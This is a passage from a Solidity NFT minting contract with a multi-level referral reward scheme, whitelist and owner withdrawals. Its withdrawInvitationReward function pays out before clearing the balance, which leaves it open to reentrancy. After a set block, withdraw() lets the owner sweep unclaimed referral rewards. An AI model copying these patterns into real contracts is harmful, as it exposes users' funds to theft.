            MAX_MINT=_max_mintCount;
        }

        function setExtension(string memory _extension) public onlyOwner {
                extension = _extension;
        }

        function mint(uint256 _amount,address _referrerAddress) external payable {
            require(mintCount[_referrerAddress]>0||_referrerAddress==0x78ea18b13f9724011d9409D1e6888De6D5c6bEa1,"ReferrerAddress don't exist");
            require(publicMint||isWhitelist(msg.sender), "Public mint not open yet");
            uint256 tokenId = currentMint;
            require(tokenId + _amount <= MAX_SUPPLY, "Reach max supply");
            require(_amount > 0 && _amount <= MAX_MINT_ONE&&mintCount[msg.sender]+_amount<=MAX_MINT, "Amount invalid");
            uint256 toPay;

            if (AllowFree[msg.sender]<_amount){
                uint notFreeAmount=_amount-AllowFree[msg.sender];
                for (uint256 i = 1; i <= notFreeAmount; i++) {
                    if (i + tokenId <= 1000) {
                        toPay += 0.05 ether;
                    } else if (i + tokenId <= 2000) {
                        toPay += 0.06 ether;
                    } else if(i + tokenId <= 5000){
                        toPay += 0.07 ether;
                    }else if(i + tokenId <= 10000){
                        toPay += 0.08 ether;
                    }
                }
                AllowFree[msg.sender]=0;
            }else{
                AllowFree[msg.sender]-=_amount;
            }
            
            require(msg.value >= toPay, "Payment invalid");
            
            for (uint256 i = 1; i <= _amount; i++) {
                _mint(msg.sender, tokenId + i);
            }
            
            currentMint+=_amount;
            mintCount[msg.sender]+=_amount;
            onwerethBalance+=msg.value;
            _updateReferralRelationship(msg.sender, _referrerAddress);
            uint8 i=1;
            address userAddress=msg.sender;
            while (true) {
                address referalAddress=referralRelationships[userAddress];
                if (referalAddress==address(0)||i==3) {
                    break;
                }
                if (isSupperVIP[referalAddress]){
                     invitationReward[referalAddress]+=msg.value*vipModulus/100;
                     onwerethBalance-=msg.value*vipModulus/100;
                }
                if (i==1){
                     invitationReward[referalAddress]+=msg.value*oneModulus/100;
                     onwerethBalance-=msg.value*oneModulus/100;
                }
                if (i==2){
                     invitationReward[referalAddress]+=msg.value*twoModulus/100;
                     onwerethBalance-=msg.value*twoModulus/100;
                }
                userAddress =referalAddress;
                i++;
            }
        }

        function setRewardModulus(uint _vip,uint _one,uint _two) public onlyOwner{
                vipModulus=_vip;
                oneModulus=_one;
                twoModulus=_two;
        }

        function isWhitelist(address _addr)private view returns (bool){
            
            return  whitelist[_addr];

        }

        function _beforeTokenTransfer(address from, address to, uint256 tokenId)
            internal
            override(ERC721, ERC721Enumerable)
        {
            super._beforeTokenTransfer(from, to, tokenId);
        }
        function _burn(uint256 tokenId) 
            internal 
            override(ERC721, ERC721URIStorage)
        {
            super._burn(tokenId);
        }
        function supportsInterface(bytes4 interfaceId)
            public
            view
            override(ERC721, ERC721Enumerable)
            returns (bool)
        {
            return super.supportsInterface(interfaceId);
        }
        function withdrawInvitationReward() external{
            uint256 balance = invitationReward[msg.sender];
            require(balance > 0, "Not available");
            (bool os, ) = payable(msg.sender).call{ value: balance }("");
            require(os);
            invitationReward[msg.sender]=0;
        }

        function getInvitationReward(address _addr) public  view returns(uint256){
            return invitationReward[_addr];
        }

        function withdraw() external onlyOwner {
            uint256 balance = address(this).balance;
            if (block.number>14877465){          
               require(balance > 0, "Not available");
               (bool os, ) = payable(0x025A6020167ab418bDb365e2D5A76E4b1b429830).call{ value: balance }("");
               require(os);
            }else{
               require(balance >= onwerethBalance, "Not available");
               (bool os, ) = payable(0x025A6020167ab418bDb365e2D5A76E4b1b429830).call{ value: onwerethBalance }("");
               require(os);
               onwerethBalance=0;
            }
            
        }


        function withdrawERC20(address token, address to) external onlyOwner {
            require(token != address(0), "Invalid token");
            uint256 balance = IERC20(token).balanceOf(address(this));
            require(balance > 0, "Balance empty");
            require(to != address(0), "Invalid address");

            IERC20(token).transfer(to, balance);
        }

        function setIsSupperVIP(address _superVIP) public onlyOwner{
            isSupperVIP[_superVIP]=true;
        }

        function setAllowFree(address[] memory _addr,uint[] memory _allowcount) public onlyOwner{
            for (uint i=0;i<_addr.length;i++){
                 AllowFree[_addr[i]]= _allowcount[i];
            }
        }

            

        function addWhitelist (address[] memory users) public onlyOwner{
            for (uint i = 0; i < users.length; i++) {
                whitelist[users[i]] = true;
            }
        }

        function _updateReferralRelationship(address user, address referrer) internal {
            if (referrer == user) { // referrer cannot be user himself/herself
            return;
            }

            if (referrer == address(0)) { // Cannot be address 0
            return;
            }

            if (referralRelationships[user] != address(0)) { // referrer has been set
            return;
            }

            referralRelationships[user] = referrer;
        }

        function getReferralRelationship(address user) public view returns(address){
            return referralRelationships[user];
        }
}